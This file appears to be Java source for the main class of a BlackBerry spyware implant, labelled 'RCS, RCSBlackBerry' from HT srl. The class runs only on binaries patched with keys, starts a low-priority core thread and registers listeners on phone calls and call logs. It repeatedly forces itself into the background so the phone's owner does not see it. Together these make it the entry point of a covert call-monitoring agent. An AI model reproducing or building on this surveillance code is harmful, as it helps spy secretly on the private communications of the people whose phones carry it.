//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.UiApplication; //#ifdef TEST
import tests.MainTest; //#endif
import blackberry.config.Keys;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Main.
 * Antenna defines: DBC,HAVE_PERMISSIONS,HAVE_MIME,EVENTLOGGER
 */
public class Main extends UiApplication {

    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#ifdef TEST
        if (args.length > 0) {
            System.out.println("Test");
            new MainTest();
            return;
        }

        //#endif
        final Keys keys = Keys.getInstance();
        final boolean binaryPatched = keys.hasBeenBinaryPatched();

        if (binaryPatched) {
            new Main().enterEventDispatcher();
        } else {
            //#ifdef DEBUG
            System.out.println("Not binary patched, bailing out!");
            //#endif
        }

    }

    private final Debug debug;

    AppListener appListener;

    /**
     * Instantiates a new main.
     */
    public Main() {
        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);

        appListener = AppListener.getInstance();
        final Core core = Core.getInstance();

        debug = new Debug("Main", DebugLevel.VERBOSE);
        debug.info("RCSBlackBerry " + Version.getString());

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();

        goBackground();
    }

    /**
     * 
     */
    public void startListeners() {
        //#ifdef DEBUG_INFO
        debug.info("Starting Listeners");
        //#endif

        addHolsterListener(appListener);
        addSystemListener(appListener);
        Phone.addPhoneListener(appListener);
        PhoneLogs.addListener(appListener);

        goBackground();

    }

    public void goBackground() {
        invokeLater(new Runnable() {
            public void run() {
                UiApplication.getUiApplication().requestBackground();
                //#ifdef DEBUG_TRACE
                debug.trace("Main foreground: " + UiApplication.getUiApplication().isForeground());
                //#endif
            }
        });

    }

    /**
     * 
     */
    public void stopListeners() {
        //#ifdef DEBUG_INFO
        debug.info("Stopping Listeners");
        //#endif

        removeHolsterListener(appListener);
        removeSystemListener(appListener);
        Phone.removePhoneListener(appListener);
        PhoneLogs.removeListener(appListener);

        goBackground();
    }
}
